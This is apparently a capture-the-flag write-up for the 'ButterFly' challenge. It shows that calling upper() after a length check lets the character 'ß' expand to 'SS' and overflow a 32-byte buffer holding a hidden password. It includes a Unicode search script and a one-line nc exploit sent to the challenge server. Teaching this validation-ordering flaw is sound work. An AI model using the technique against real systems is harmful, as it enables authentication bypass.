The name ButterFly suggests some kind of buffer overflow. Let's examine the python script.

In summary, 
- We have a buffer of 32 bytes.
- There is a hidden password of 16 bytes, which is written on the second half (from the 17th byte) of the buffer.  
- We have to input a password which is written on the buffer from the start.  
- Finally, we get the flag if the first 16 bytes matches the other 16 bytes.

So, the first thing that comes to mind is to overwite the complete buffer with same bytes, and get the flag.  
But, there's a small restriction. In the `authenticate` function, we have a check for input length, and it has to be less than 16.
```py
if len(user_input) > 16:
        print('PLEASE INPUT A PASSWORD LESS THAN 16 CHARACTERS LONG')
        return False
```
But, it actually allows input of length upto 16, not strictly less.  
But it doesn't help much, since we can't just input a 32 character string.  
Let's read further.  
```py
user_input = user_input.upper()
```
This part is interesting, and it happens after the length check, and just before it writes the input to the buffer.  
This makes us think if there is way to change string's length by applying `str.upper()` method.  

Let's write a quick script to check if its possible.  
I iterate over all utf-8 characters, and check is `char.upper()` is of length 2.  
For iterating over utf-8 characters, I just grabbed some code from github. 

```py
#!/usr/bin/env python

def main():
    for char in utf8_iterator():
        if len(char) == 1 and len(char.upper()) == 2:
            print(char, char.upper())
            break

# from https://github.com/Lucas-C/dotfiles_and_notes/blob/master/languages/python/utf8_iterator.py
import itertools

def byte_iterator(start, end):
    for i in range(start, end):
        yield bytes((i,))

def utf8_bytestring_iterator():
    # Doc: https://en.wikipedia.org/wiki/UTF-8#Description & https://fr.wikipedia.org/wiki/UTF-8#Description
    yield from byte_iterator(0x00, 0x80)  # 2^7 characters
    for i, j in itertools.product(byte_iterator(0xc0, 0xe0),
                                  byte_iterator(0x80, 0xc0)):  # 2^11 characters
        yield b''.join((i, j))  # Some additional restrictions could be applied here (start=0xc2)
    for i, j, k in itertools.product(byte_iterator(0xe0, 0xf0),
                                     byte_iterator(0x80, 0xc0),
                                     byte_iterator(0x80, 0xc0)):  # 2^16 characters
        yield b''.join((i, j, k))  # Some additional restrictions could be applied here
    for i, j, k, l in itertools.product(byte_iterator(0xf0, 0xf8),
                                        byte_iterator(0x80, 0xc0),
                                        byte_iterator(0x80, 0xc0),
                                        byte_iterator(0x80, 0xc0)):  # 2^21 characters
        yield b''.join((i, j, k, l))  # Some additional restrictions could be applied here

def utf8_iterator():
    for bytestring in utf8_bytestring_iterator():
        try:
            yield bytestring.decode('utf8')
        except UnicodeError:
            pass

if __name__ == '__main__':
    main()
```
And we found one!  Its `ß`. And `'ß'.upper() == 'SS'`.  

We use it to get our final exploit  
```sh
#!/bin/bash
python -c "print('ß'*16)" | nc ctf.cscml.zenysec.com 20007  
```
